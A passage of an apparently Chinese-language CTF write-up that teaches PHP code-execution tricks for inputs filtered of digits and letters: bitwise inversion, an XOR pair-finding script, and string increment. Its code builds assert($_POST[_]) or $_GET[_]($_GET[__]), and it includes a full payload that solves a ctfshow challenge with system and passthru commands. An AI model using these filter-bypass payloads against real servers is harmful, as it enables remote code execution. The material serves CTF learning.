class="line"></span><br></pre></td></tr></table></figure><p>只需要修改$shell=''即可，例如assert就可以通过“极区区皮十勺”得到，POST可以通过“寸小欠立”得到</p><p>注意：assert在PHP7.0.12以上版本中已经不能够执行命令了（assert()内如果是字符串会当作php代码执行）</p><p>取反：~($var1{1});</p><p>所以我们需要用符号构造出1，这里可以使用$_<ins>；使得变量的值变为1（i</ins>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>++;<span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;<span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span> = <span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//相当于assert(_POST[_]);</span></span><br><span class="line"><span class="comment">//传参时需要进行一次URL编码</span></span><br></pre></td></tr></table></figure><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/3.png" class title="qwq"><p>这就是执行的结果</p><h2><span id="3异或"> 3.异或</span></h2><p>异或运算：比方5^Z</p><p>5的ASCII码是53，转成二进制是00110101，Z的ASCII码是90，转成二进制是01011010，二者异或会得到</p><p>01101111，转成字符串就是o</p><p>所以我们可以通过这个特性构造出我们想要的字符</p><p>接下来就是上大佬的脚本时间了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//result:!((%)(</span></span><br><span class="line"><span class="comment">//@[[@[\</span></span><br></pre></td></tr></table></figure><p>所以assert可以通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;!((%)(&quot;</span>^@[[@[\<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>得到，注意反斜杠转义需要多加一个\，即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;!((%)(^&quot;</span>@[[@[\\<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>_POST:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span></span><br></pre></td></tr></table></figure><p>所以可以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;<span class="variable">$__</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p>同样需要进行url编码</p><p>执行成功：</p><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/5.png" class title="qwq"><h2><span id="4自增"> 4.自增</span></h2><p>运行一下，看看会得出什么？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$___</span>++;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$___</span>;</span><br></pre></td></tr></table></figure><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/6.png" class title="qwq"><p>很神奇吧，会拼凑出A、B</p><p>解释一下：在Dest0g3-520迎新赛中有解释过 . 能够拼接变量，数组拼接字符串会显示Array（第一步）</p><p>第二步，截取A</p><p>A++ =&gt; B; B++=&gt;C…以此类推，可以得到A-Z所有字符，然后不断通过拼接，总能得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[_]);</span><br><span class="line">或者<span class="variable">$_GET</span>[_](<span class="variable">$_GET</span>[__]);的形式</span><br><span class="line">（第二个可以执行<span class="title function_ invoke__">highlight_file</span>(/flag)）</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br><span class="line"><span class="comment">//这就是自增的过程，又长又臭</span></span><br></pre></td></tr></table></figure><p>这里直接上一个题好了（ctfshow的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的过滤了一堆符号，并且不能使用数字，英文字母（</p><p>其实跑一下脚本看看能用什么更加直观：</p><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/7.png" class title="qwq"><p>基本上能用的只有符号，不过没有限制下划线，加号，中括号小括号和$</p><p>然后提示是吃瓜杯的shellme，去看一下，wp是自增构造的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//shellme_revenge的源码，可以看到还能够用C、0123,上面比他更加严格一点,payload是构造的$_GET[0]($_GET[1]);形式</span></span><br></pre></td></tr></table></figure><p>但是这题不能够用任何数字（虽然没多大影响）</p><p>只需要构造出A，就能够造出_GET，那就能够传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="variable">$___</span>=(<span class="variable">$_</span>[<span class="variable">$__</span>]);<span class="comment">//构造出A</span></span><br><span class="line"><span class="variable">$____</span>=<span class="variable">$___</span>; <span class="comment">//赋值</span></span><br><span class="line"><span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++; <span class="comment">//$___=G</span></span><br><span class="line"><span class="variable">$_____</span>=<span class="variable">$___</span>;<span class="comment">//$_____=G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$____</span>;<span class="comment">//$___=A</span></span><br><span class="line"><span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="comment">//$___=E</span></span><br><span class="line"><span class="variable">$_____</span>.=<span class="variable">$___</span><span class="comment">//$_____=GE</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$____</span>;<span class="comment">//$___=A</span></span><br><span class="line"><span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="comment">//$___=T</span></span><br><span class="line"><span class="variable">$_____</span>.=<span class="variable">$___</span>;<span class="comment">//$_____=GET</span></span><br><span class="line"><span class="variable">$______</span>=_.<span class="variable">$______</span><span class="comment">//$______=_GET</span></span><br><span class="line"><span class="variable">$$______</span>[_](<span class="variable">$$______</span>[__]);<span class="comment">//$_GET[_]($_GET[__]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只需要传参执行命令即可：</p><p>总体payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. url/?_=system&amp;__=ls /    <span class="comment">//ps：system如果被禁用可以换成passthru</span></span><br><span class="line"><span class="number">2</span>. Post data:ctf_show=<span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.[];<span class="variable">$___</span>=(<span class="variable">$_</span>[<span class="variable">$__</span>]);<span class="variable">$____</span>=<span class="variable">$___</span>;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$_____</span>=<span class="variable">$___</span>;<span class="variable">$___</span>=<span class="variable">$____</span>;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$_____</span>.=<span class="variable">$___</span>;<span class="variable">$___</span>=<span class="variable">$____</span>;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$___</span>++;<span class="variable">$_____</span> .=<span class="variable">$___</span>;<span class="variable">$______</span> =_.<span class="variable">$_____</span>;<span class="variable">$$______</span>[_](<span class="variable">$$______</span>[__]);</span><br><span class="line"><span class="comment">//发现f1agaaa</span></span><br></pre></td></tr></table></figure><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/8.png" class title="qwq"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后，可以用两种方式：</span><br><span class="line"><span class="number">1</span>.url/?_=passthru&amp;__=cat /f1agaaa</span><br><span class="line"><span class="number">2</span>.url/?_=highlight_file&amp;__=/f1agaaa</span><br><span class="line">能够得出同样的结果</span><br></pre></td></tr></table></figure><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/9.png" class title="qwq"><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/10.png" class title="qwq"><h2><span id="5post执行"> 5.Post执行</span></h2><p>通过Post一个文件使用#!/bin/sh命令并用.（点）执行这个文件，就可以执行命令</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span 